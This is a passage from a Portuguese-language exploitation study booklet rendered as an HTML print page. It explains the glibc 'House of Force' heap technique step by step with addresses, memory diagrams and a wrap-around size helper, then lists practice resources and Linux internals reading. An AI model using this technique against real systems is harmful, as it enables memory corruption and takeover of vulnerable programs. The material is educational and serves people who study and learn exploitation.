Vamos supor que o heap comeÃ§a em 0x40000 e o alvo esta em 0x60704

Alem disso, vamos supor que o top_size esta no endereÃ§o 0x400d0

Assim, queremos alocar um chunk que pare um pouco antes do alvo, 
esse chunk servira somente para &quot;andar ate la&quot;

Assim, quando alocarmos um chunk, ele vai ocupar a mesma posiÃ§Ã£o que o alvo

&gt;&gt;&gt; hex((0x60704 - 0x20) - 0x400d0)
'0x20614'
 ______________________________  ___ 0x40000
|                              | 
|  Resto do heap blablabla     |  
|______________________________| 
|             | Size: 0x20     |
|   AAAAAAAAAAAAAAAAAAAAAAA    |
|______________________________| ___ 0x400d0 -&gt; &amp;top_size ficava aqui
|                              |
|     NAO ESCREVER NESSE       |  &lt;- malloc(0x20614)
|     CHUNK, ELE PODE ESTAR    |  
|     PASSANDO POR MEMORIA     |
|  READ_ONLY E CAUSAR SEGFAULT |
|                              |  
 ... ...  ... ... ...  ...  ...
|______________________________| ___ 0x606e4 -&gt; alvo - 0x20
|                              |  
| Top size: 0xfffffffffffdf9eb |
|______________________________|

Agora, um ultimo chunk para cobrir alvo

 ______________________________  ___ 0x40000
|                              | 
|  Resto do heap blablabla     |  
|______________________________| 
|             | Size: 0x20     |
|   AAAAAAAAAAAAAAAAAAAAAAA    |
|______________________________| ___ 0x400d0 -&gt; &amp;top_size ficava aqui
|                              |
|     NAO ESCREVER NESSE       |
|     CHUNK, ELE PODE ESTAR    |  
|     PASSANDO POR MEMORIA     |
|  READ_ONLY E CAUSAR SEGFAULT |
|                              |  
 ... ...  ... ... ...  ...  ...
|______________________________| ___ 0x606e4
|             | Size: 0x30     |  
|                              | &lt;- malloc(0x28) 
|                              |  
|                              | ___ 0x60704 -&gt; alvo
|                              |  
|______________________________| ___ 0x60714 
|                              |  
| Top size: 0xfffffffffffdf9cb |
|______________________________|

Um edit no chunk pode alterar o alvo!

def Resumo():
    Chunk_1 -&gt; *top_size = 0xfff...
    Chunk_2 -&gt; gigante, usado para atravessar a distancia
    Chunk_3 -&gt; Pode alterar o alvo


Na pratica, o Chunk_3 talvez tenha um tamanho que 
voce nao controle! Ou, alguma outra limitaÃ§Ã£o assim!

A situaÃ§Ã£o ideal ocorre quando o inicio da user_data do Chunk_3 
coincide com o endereÃ§o do alvo! pois voce nao precisa usar 
padding para alcanÃ§ar o alvo e portanto, nao arrisca 
danificar outras partes da memoria!

EntÃ£o quando estiver praticando, vale a pena ficar brincando com o tamanho do 
Chunk_2 para acertar a mira direitinho :D
</code></pre>
<a class="header" href="print.html#va-wrap-around" id="va-wrap-around"><h1>VA Wrap-Around</h1></a>
<p>No caso anterior, o endereÃ§o do alvo era maior que o do heap!</p>
<p>heap: 0x40000 &lt;------&gt; alvo: 0x60704</p>
<p>E caso seja ao contrario? Vamos precisar dar uma volta no VA space!</p>
<blockquote>
<p>VA = Virtual Address = EndereÃ§o Virtual = 0x0000000000000000 ate 0xffffffffffffffff</p>
</blockquote>
<p>Os endereÃ§os no VA space dao um loop, assim:</p>
<blockquote>
<p>Se voce esta em 0xffffffffffffff45 e anda para frente, voce vai terminar em 0x0000000000000000a3 ! Dando uma volta no VA space!</p>
</blockquote>
<p>Nos podemos fazer o mesmo com o <code>Chunk_2</code> ! Permitindo que o <code>Chunk_3</code> fique
em um endereÃ§o anterior ao heap! :D</p>
<p>Para encontrar o tamanho do <code>Chunk_2</code> que possibilite isso, podemos usar a funÃ§Ã£o:</p>
<pre><code class="language-py">def wrap(A,B):
    return (0xffffffffffffffff - A)+B
    #      || tamanho ate        || O quanto andar depois
    #      || O fim do VA space  || de dar o loop 
    
    # Com A = base_do_heap + quantidade_gasta = &amp;top_size
    # B = alvo - 0x20 (tamanho do Chunk_3)  
</code></pre>
<a class="header" href="print.html#limitaÃ§Ãµes" id="limitaÃ§Ãµes"><h1>LimitaÃ§Ãµes</h1></a>
<ul>
<li>Requer um heap leak</li>
<li>VersÃ£o Glibc &lt; 2.29</li>
</ul>
<a class="header" href="print.html#fontes-e-materiais-para-praticar" id="fontes-e-materiais-para-praticar"><h1>Fontes e Materiais para praticar</h1></a>
<ul>
<li><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.27/house_of_force.c">shellphish/how2heap</a></li>
<li>La tambÃ©m tem o link pra alguns ctfs que usam house of force!</li>
<li><a href="https://www.udemy.com/share/1039QMBEYadFpWRXo=/">O curso de Heap Exploits do Max Kamper</a> </li>
</ul>
<a class="header" href="print.html#linux-internals" id="linux-internals"><h1>Linux Internals</h1></a>
<a class="header" href="print.html#prerequisitos" id="prerequisitos"><h1>Prerequisitos</h1></a>
<p>Tanto coisas que eu ja comentei nesse livrinho quanto coisas que deu preguiÃ§a..
. hehe</p>
<ul>
<li>Loader, Linker, GOT e PLT
<ul>
<li><a href="https://manybutfinite.com/post/anatomy-of-a-program-in-memory/">Anatomy of a program in memory</a></li>
<li><a href="https://www.pwnthebox.net/reverse/engineering/and/binary/exploitation/series/2019/11/10/understanding-the-loader-part1-how-does-an-executable-get-loaded-to-memory.html">Understanding the Loader - Part1</a></li>
<li><a href="https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html">PLT and GOT - the key to code sharing and dynamic libraries</a></li>
</ul>
</li>
<li>Syscalls
<ul>
<li><a href="https://man7.org/linux/man-pages/man2/syscall.2.html">man syscalls</a></li>
<li><a href="https://chromium.googlesource.com/chromiumos/docs/+/HEAD/constants/syscalls.md">Em arquiteturas comuns</a></li>
</ul>
</li>
<li>Signals e Processos
<ul>
<li><a href="https://www.win.tue.nl/%7Eaeb/linux/lk/lk-5.html">The Linux kernel: Signals</a></li>
<li><a href="https://linoxide.com/how-tos/signal-handling-linux-signal-function/">Signal Handling In Linux Through The signal() Function</a></li>
</ul>
</li>
</ul>

                </div>

                <!-- Mobile navigation buttons -->
                

                

            </div>

            

            

        </div>


        <!-- Local fallback for Font Awesome -->
        <script>
            if ($(".fa").css("font-family") !== "FontAwesome") {
                $('<link rel="stylesheet" type="text/css" href="_FontAwesome/css/font-awesome.css">').prependTo('head');
            }
        </script>

        <!-- Livereload script (if served using the cli tool) -->
        

        

        

        
        <script>
            $(document).ready(function() {
                window.print();
            })
        </script>
        

        <script src="highlight.js"></script>
        <script src="book.js"></script>

        <!-- Custom JS script -->
        

    </body>
</html>
